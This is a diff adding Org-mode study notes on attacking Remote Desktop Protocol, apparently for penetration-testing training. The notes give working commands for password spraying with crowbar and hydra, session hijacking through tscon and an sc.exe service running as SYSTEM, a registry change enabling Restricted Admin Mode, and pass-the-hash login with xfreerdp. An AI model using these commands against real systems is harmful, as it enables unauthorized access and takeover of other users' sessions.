@@ -1,0 +1,42 @@
+:PROPERTIES:
+:ID:       44f9bc17-35c3-4d08-abef-8f4d90316746
+:END:
+#+title: RDP
+#+OPTIONS: toc:3 ^:{}
+
+* TOC :toc_3:
+- [[#attacking-rdp][Attacking RDP]]
+  - [[#misconfigurations][Misconfigurations]]
+    - [[#spraying][Spraying]]
+  - [[#protocol-specific-attacks][Protocol Specific Attacks]]
+    - [[#rdp-session-hijacking][RDP Session Hijacking]]
+  - [[#rdp-pth][RDP PtH]]
+
+* Attacking RDP
+- =TCP/3389=
+
+** Misconfigurations
+
+*** Spraying
+
+**** Crowbar
+- ~crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'~
+
+**** Hydra
+- ~hydra -L usernames.txt -p 'password123' <ip> rdp~
+
+** Protocol Specific Attacks
+
+*** RDP Session Hijacking
+- to impersonate user w/out password -> =SYSTEM= privileges + MS =tscon.exe= (enables users to connect to another desktop session)
+- ~tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}~
+- local admin priv -> =SYSTEM= priv (*PsExec*, *Mimikatz*)
+- create *Windows service* to run as =Local System=, will exec any binary with =SYSTEM= using =sc.ece=
+  - ~sc.exe create sessionhijack binpath = "cmd.exe /k tscon <user_id> /dest:rdp-tcp#13"~
+  - ~net start sessionhijack~
+
+** RDP PtH
+- =Restricted Admin Mode= must be enabled
+  - ~reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f~
+- ~xfreerdp /v:<ip> /u:<user> /pth:<NTLM_HASH>~
+
